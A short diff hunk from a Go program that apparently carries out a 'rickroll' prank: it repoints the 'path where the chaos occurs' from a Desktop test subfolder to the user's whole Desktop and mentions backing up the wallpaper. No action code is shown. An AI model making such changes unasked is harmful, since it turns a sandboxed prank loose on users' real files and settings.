@@ -51,7 +51,7 @@ var (
 	//These are constants too
 	HOMEDIR, _   = os.UserHomeDir()
 	PATH_DESKTOP = filepath.Join(HOMEDIR, "Desktop")
-	PATH         = filepath.Join(PATH_DESKTOP, "test") //Path where the chaos occurs
+	PATH         = PATH_DESKTOP //Path where the chaos occurs
 	//Variables
 	//Stores the path of user's wallpaper before rickrolling
 	BackupWall                = ""
